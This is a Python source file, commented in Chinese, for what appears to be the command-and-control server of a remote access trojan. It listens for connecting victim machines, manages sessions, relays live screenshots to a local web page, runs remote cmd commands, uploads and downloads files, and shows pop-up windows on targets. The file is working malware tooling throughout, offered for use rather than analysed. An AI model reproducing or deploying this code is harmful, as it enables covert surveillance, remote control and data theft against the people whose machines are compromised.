import os
import socket
import threading
import time
from flask import Flask, render_template, send_file
from flask_socketio import SocketIO, emit
import logging
import struct

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'
app.logger.disabled = True
log = logging.getLogger('werkzeug')
log.disabled = True

socketio_log = logging.getLogger('socketio')
socketio_log.setLevel(logging.ERROR)
engineio_log = logging.getLogger('engineio')
engineio_log.setLevel(logging.ERROR)
socketio = SocketIO(app, cors_allowed_origins="*")
IMAGE_PATH = "D:\\b.jpg"  # 图片保存路径
HOST_JSON_PATH = "D:\\BlackWind\\host.json"  # 主机列表保存路径
WEB_PORT = 5000  # Web服务端口
LISTEN_PORT = 8080  # 图片接收端口
lock = threading.Lock()
last_modified = 0
is_svrun = threading.Event()
current_socket = None
current_host = None
socket_list = []
count_session = 1;
#资源回收函数
def socket_clean():
    global socket_list,current_socket,current_host,count_session
    index = 0
    for socket_d in socket_list:
        if socket_d["address"] == current_host:
            socket_list.pop(index)
            break
        index += 1
    current_socket = None
    current_host = None
    count_session -= 1

#屏幕监控类，将屏幕画面渲染在本地网页中
class screen:
    #构造函数
    def __init__(self):
        self.is_webrunning = False
        self.server = None
    #屏幕监控函数
    def screen_view(self):
        global current_host, current_socket, socket_list, is_svrun,count_session
        if is_svrun.is_set():
            global last_modified
            self.start_web_server()
        try:
            while is_svrun.is_set():
                size = current_socket.recv(4)
                if not size:
                    print("session closed")

                image_size = struct.unpack("!I",size)[0]
                receive = b""
                remaining = image_size
                while remaining > 0 and is_svrun.is_set():
                    data = current_socket.recv(min(remaining,4096))
                    if not data:
                        print("session closed")
                        socket_clean()
                        is_svrun.clear()
                        break
                    receive += data
                    remaining -= len(data)
                with lock:
                    with open("D:\\b.jpg", "wb") as f:
                        f.write(receive)
                if remaining == 0:
                    with lock:
                        last_modified = time.time()
                        socketio.emit('image_updated', {'timestamp': last_modified})

        except ConnectionResetError:
            print("session closed")
            socket_clean()

            is_svrun.clear()
        except Exception as e:
            print(e)
        self.stop_web_server()
        is_svrun.clear()
    def stop_web_server(self):
        if self.is_webrunning and self.server:
            with app.app_context():
                shutdown_func = self.server.environ.get('werkzeug.server.shutdown')
                if shutdown_func:
                    shutdown_func()  # 安全关闭服务器
            self.web_thread.join(timeout=1.0)
            self.is_webrunning = False
            self.server = None  # 重置服务器实例
            print("Web服务已停止")
    #开启本地web服务函数
    def start_web_server(self):
        if not self.is_webrunning:
            def run_server():
                self.server = socketio.run(
                    app,
                    host='0.0.0.0',
                    port=WEB_PORT,
                    debug=False,
                    allow_unsafe_werkzeug=True,
                    use_reloader=False  # 禁用自动重载，避免多进程问题
                )
            self.web_thread = threading.Thread(target=run_server, daemon=True)  #启动线程
            self.web_thread.start()
            self.is_webrunning = True

#路由
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/image')
def get_image():

    with lock:
        if os.path.exists(IMAGE_PATH) and os.path.getsize(IMAGE_PATH) > 0:
            return send_file(IMAGE_PATH, mimetype='image/jpeg')
        return "暂无图片", 404

# WebSocket事件
@socketio.on('connect')
def handle_connect():
    print('Web客户端已连接')
    # 发送当前图片时间戳
    emit('image_updated', {'timestamp': last_modified})



class server:

    def __init__(self):
        global is_svrun, current_host, current_socket, socket_list,count_session
        #判断当前路径下的templates以及index.html是否完整
        if not os.path.exists("templates"):
            os.makedirs("templates")
        if not os.path.exists("templates/index.html"):
            with open("templates/index.html","a") as file:
                #写入相关前端代码
                file.write("""<!DOCTYPE html>
<html>
<head>
    <title>实时图片显示</title>
    <style>
        body { 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
            background: #f0f0f0; 
        }
        #image-container { 
            max-width: 100%; 
            max-height: 100%; 
        }
        #live-image { 
            max-width: 100%; 
            max-height: 80vh; 
            box-shadow: 0 0 10px rgba(0,0,0,0.3); 
        }
    </style>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
</head>
<body>
    <div id="image-container">
        <img id="live-image" src="" alt="实时画面">
    </div>

    <script>
        const socket = io();
        const imageElement = document.getElementById('live-image');
        
        function updateImage(timestamp) {
            // 添加时间戳防止缓存
            imageElement.src = `/image?timestamp=${timestamp}`;
        }
        
        // 接收图片更新通知
        socket.on('image_updated', (data) => {
            updateImage(data.timestamp);
        });
        
        // 页面加载时初始化
        window.onload = () => {
            socket.on('connect', () => {
                console.log('已连接到服务器');
            });
        };
    </script>
</body>
</html>""")
        #启动线程来接收客户端连接
        self.t1 = threading.Thread(target=self.receive,daemon=True)
        self.t1.start()

        #循环等待用户输入命令
        while True:
            if current_socket == None:
                print("(None)Please enter command : ",end="")
                command_ = input("")
            else:
                print(f"({current_host[0]}:{current_host[1]}) Please enter command : ",end="")
                command_ = input("")
            if command_ == "sessions":
                print("ID          客户端               主机名               系统版本              进程名              进程id")
                for socket_d in socket_list:
                    print(f"{socket_d['session']}       {socket_d['address'][0]}:{socket_d['address'][1]}")
            elif command_[0:7] == "session":
                recvid = int(command_.replace("session","").replace(" ",""))
                for socket_d in socket_list:
                    if recvid == socket_d["session"]:
                        current_socket = socket_d["socket"]
                        current_host = socket_d["address"]

            elif command_ == "screenview" and current_socket != None:
                try:
                    current_socket.sendall(struct.pack("!I", len("screenview")))
                    current_socket.sendall("screenview".encode("utf-8"))
                except ConnectionError:
                    print("session closed")
                    socket_clean()
                    continue
                is_svrun.set()
                threading.Thread(target=screen().screen_view,daemon=True).start()   #启动线程来进行屏幕监控
                print("screenview start...")
            elif command_ == "exitsv" and current_socket != None:
                try:
                    current_socket.sendall(struct.pack("!I", len("exitsv")))
                    current_socket.sendall("exitsv".encode("utf-8"))
                except ConnectionError:
                    print("session closed")
                    socket_clean()
                    continue
                is_svrun.clear()

            elif command_ == "quit" and current_socket !=None:
                try:
                    current_socket.sendall(struct.pack("!I", len("quit")))
                    current_socket.sendall("quit".encode("utf-8"))
                    socket_clean()
                    print("over!")
                except ConnectionError:
                    print("quit fail")
                    socket_clean()
            elif command_ == "help":
                print(
"""
sessions                        -----列出会话
session                         -----进入会话[ID]
screenview                      -----屏幕监控
exitsv                          -----退出屏幕监控
getcmd                          -----执行cmd
exitcmd                         -----退出cmd
upload [file1] [file2]          -----上传file1到file2
download [file1] [file2]        -----下载file1到file2
showwindow [String]             -----弹窗显示字体
quit                            -----结束
"""
)
            elif command_ == "getcmd" and current_socket != None:

                try:
                    current_socket.sendall(struct.pack("!I", len("getcmd")))
                    current_socket.sendall("getcmd".encode("utf-8"))
                    self.getcmd()
                except ConnectionError:
                    print("session closed")
                    socket_clean()
                    continue
            elif "showwindow" in command_ and current_socket!=None:
                try:
                    current_socket.sendall(struct.pack("!I", len(command_)))
                    current_socket.sendall(command_.encode("utf-8"))
                except ConnectionError:
                    print("session closed")
                    socket_clean()
                    continue
            elif command_[0:6] == "upload" and current_socket != None:
                self.upload(command_)
            elif command_[0:8] == "download" and current_socket !=None:
                self.download(command_)
    #下载文件函数
    def download(self,command_):
        global is_svrun, current_host, current_socket, socket_list, count_session
        str_list = command_.split(" ")
        download_path = str_list[1]
        save_path = str_list[2]
        try:
            current_socket.sendall(struct.pack("!I", len("download")))  #发送命令长度
            current_socket.sendall("download".encode("utf-8"))
            path_len = len(download_path.encode("utf-8"))   #发送路径长度
            current_socket.sendall(struct.pack("!I", path_len))
            current_socket.sendall(download_path.encode("utf-8"))
            fillsize = current_socket.recv(4)   #接收文件大小
            fillsize = struct.unpack("!I",fillsize)[0]
            remaining = fillsize
            #保存文件
            with open(save_path,"wb") as file:
                receive = b""
                while remaining>0:
                    rel = current_socket.recv(remaining)
                    if not rel:
                        break
                    remaining-=len(rel)
                    receive+=rel
                file.write(receive)
                print("下载完成")

        except ConnectionError:
            print("session closed")
            socket_clean()
    #上传文件函数
    def upload(self,command_):
        global is_svrun, current_host, current_socket, socket_list, count_session
        str_list = command_.split(" ")
        target_file = str_list[1]

        target_path = str_list[2]

        try:
            if os.path.isfile(target_file):
                current_socket.sendall(struct.pack("!I", len("upload")))
                current_socket.sendall("upload".encode("utf-8"))
                if os.path.isfile(target_file):
                    path_len = len(target_path.encode("utf-8"))
                    current_socket.sendall(struct.pack("!I", path_len))
                    current_socket.sendall(target_path.encode("utf-8"))
                    current_socket.sendall(struct.pack("!I",os.path.getsize(target_file)))
                    with open(target_file, "rb") as file:
                        while True:
                            chunk = file.read(4096)
                            if not chunk:
                                print("上传成功")
                                break
                            current_socket.sendall(chunk)
        except ConnectionError:
            print("session closed")
            socket_clean()

    #执行cmd命令函数
    def getcmd(self):
        global is_svrun, current_host, current_socket, socket_list,count_session
        while (True):
            command = input(f"> ")
            try:
                current_socket.sendall(command.encode("utf-8"))
                if command == "exitcmd":
                    break
                size = current_socket.recv(4)       #命令长度
                string_size = int.from_bytes(size, byteorder='big')
                remaining = string_size
                receive_data = b""
                while remaining > 0:
                    chunk = current_socket.recv(min(remaining, 1024))
                    remaining -= len(chunk)
                    receive_data += chunk
                if len(receive_data) == string_size:
                    receive_str = receive_data.decode("utf-8")
                    print(receive_str)
            except ConnectionError:
                print("session closed")
                socket_clean()
                break

    #客户端接收函数
    def receive(self):
        global is_svrun, current_host, current_socket, socket_list,count_session
        self.server_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind(("",8080))
        self.server_socket.listen(50)

        #循环等待连接
        while True:
            self.client_socket,self.client_address = self.server_socket.accept()
            self.client_json = {"session":count_session,"socket":self.client_socket,"address":self.client_address}
            temp=False
            for socket_d in socket_list:
                if self.client_address[0] == socket_d["address"][0]:
                    socket_d["socket"] = self.client_socket
                    socket_d["address"] = self.client_address
                    temp=True
                    print(f"\n{self.client_address[0]}:{self.client_address[1]} connected (session {socket_d['session']})")
                    break
            if not temp:
                socket_list.append(self.client_json)
                print(f"\n{self.client_address[0]}:{self.client_address[1]} connected (session {count_session})")
                count_session+=1

server()
